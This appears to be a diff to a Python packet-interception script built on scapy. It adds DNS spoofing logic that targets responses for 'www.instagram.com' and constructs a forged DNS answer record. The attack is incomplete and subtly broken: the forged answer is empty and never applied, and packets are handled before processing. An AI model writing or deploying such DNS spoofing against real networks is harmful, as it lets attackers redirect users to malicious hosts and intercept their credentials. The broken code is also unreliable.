@@ -15,12 +15,17 @@ def parse_arguments():
     return parser.parse_args()
 
 def process_packet(packet):
-    scapy_packet = scapy.IP(packet.get_payload())
-    print(scapy_packet.show())
     if options.drop:
         packet.drop()
     elif options.forward:
         packet.accept()
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.DNSRR):
+        qname = scapy_packet[scapy.DNSQR].qname
+        if 'www.instagram.com' in qname:
+            print('[+] Spoofing target')
+            answer = scapy.DNSRR(rrname=qname, rdata='')
+    print(scapy_packet.show())
 
 
 options = parse_arguments()
